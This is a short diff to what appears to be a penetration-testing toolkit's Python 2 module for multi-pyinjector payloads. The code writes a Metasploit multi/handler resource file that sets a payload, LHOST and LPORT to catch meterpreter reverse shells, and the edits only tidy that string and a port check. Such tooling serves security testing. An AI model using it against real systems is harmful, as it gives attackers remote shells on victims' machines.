@@ -450,6 +450,7 @@ try:
                                     ipaddr = check_options("IPADDR=")
                                 # break out if not needed
                                 if choice9 == "6": break
+
                                 shellcode_port = raw_input(setprompt(["4"], "Enter the port number [443]"))
                                 if shellcode_port == "": shellcode_port = "443"
 
@@ -457,7 +458,7 @@ try:
                                 filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
                                 port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), shellcode_port)
                                 if port_check == False:
-                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n" % (choice9, stage_encoding,ipaddr, shellcode_port))
+                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (choice9, stage_encoding,ipaddr, shellcode_port))
                                     filewrite.close()
 
                             if validate_ip(choice2) == False:
@@ -470,8 +471,9 @@ try:
                                 portnum = "LPORT=1"
 
                             # fix port num
-                            if choice1 == "multipyinject":
+                            if "multipyinject" in choice1:
                                 portnum = shellcode_port
+
                             else: portnum = portnum.replace("LPORT=", "")
 
                             # meterpreter reverse_tcp
